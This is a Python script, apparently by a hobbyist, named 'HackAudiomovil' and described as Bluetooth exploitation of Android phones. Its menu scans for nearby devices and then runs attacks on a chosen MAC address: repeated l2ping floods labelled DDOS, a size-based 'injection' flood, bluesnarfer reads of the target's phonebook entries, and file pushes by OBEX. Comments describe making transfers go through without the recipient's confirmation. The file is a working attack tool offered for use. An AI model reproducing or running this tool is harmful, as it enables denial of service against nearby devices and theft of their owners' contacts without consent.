#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading, io

# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 19:04:2020:
# Nombre del programa : HackAudiomovil
# Accion: explotacion bluetooth android  
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet -k -f /root/bluekeep/usr/font/cosmike "   		Smp_A" && figlet -k -f /root/bluekeep/usr/font/bulbhead " BlUeHaCkDrOi"')
print("			  	   Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1--CONFIG hci0" ,"2--RECONOCIMIENTO", "3--DDOS","4--INJECTION","5--CONNET DEVICE","6--SEND FILE","7--EXIT"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
	print(listamenu[5])
	print(listamenu[6])
	print(listamenu[7])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def config_dispositivo():
	print("Config dispositivo hci0")
	os.system('mkdir -p /dev/bluetooth/rfcomm')
	os.system('mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0')
	os.system('mknod --mode=666 /dev/rfcomm0 c 216 0')
	os.system('hciconfig -a hci0 up')
	os.system('hciconfig hci0')
	time.sleep(3)
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def scan_Mac_channel():
	global mac, port
	print("Escaneando dispositivos")
	os.system('hcitool scan')
	print("Scan complet")
	print("")
	mac=input("Introduzca MAc: ")
	print("")
	print("Consulta pueerto dispositivo")
	os.system('sdptool browse --tree --l2cap '+mac)
	port=input("Introduzca PORT: ")
	return mac, port
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def injection(mac):
	payload=input("Insert payload 0x00: ")
	os.system('l2ping -i hci0 -v -s ' + str(payload) +' -f ' + mac)
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def DDOS(mac):
	print("Desautificando dispositivos")
	carga="x0x00"
	os.system('x-terminal-emulator -e l2ping -i hci0 -v -s ' + str(carga) +' -f ' + mac)
	time.sleep(1)
	os.system('x-terminal-emulator -e l2ping -i hci0 -v -s ' + str(carga) +' -f ' + mac)
	time.sleep(2)
	os.system('x-terminal-emulator -e l2ping -i hci0 -v -s ' + str(carga) +' -f ' + mac)
	time.sleep(1)
	os.system('x-terminal-emulator -e l2ping -i hci0 -v -s ' + str(carga) +' -f ' + mac)
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def connection(mac,port):
	print("Intentando conectar con el dispositivo...")
	os.system('x-terminal-emulator -e bluesnarfer -r 1-100 -c '+port+' -b '+mac)
	os.system('x-terminal-emulator -e bt-agent')
	os.system('systemctl --user start obex')
	os.system('sudo systemctl --global enable obex') # modificar parametros configuracion archivo para un envio sin confirmacion ;)
	print("finalizacion de conexionado")
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
def send_file(mac):
	ruta_file=input("introduzca ruta archivo: ")
	print("send_file")
	os.system('bt-obex -p -y '+mac+' '+ruta_file)
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		config_dispositivo()
	elif (key==2):
		scan_Mac_channel()
	elif (key==3):
		DDOS(mac)
	elif (key==4):
		injection(mac)
	elif (key==5):
		connection(mac,port)
	elif (key==6):
		send_file(mac)
	elif (key==7):		
		exit=True	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#This makes sure you can send files. A sudo also in the first line will fail!
#You can send files now by bluetooth-sendto --device=12:34:56:78:9A:BC filename
#buffer '\x02\x00\x00','\x35\x03\x19','\x01\x00' no es necesario... un js de auto aceptacion file autocomplet en injection ;) 
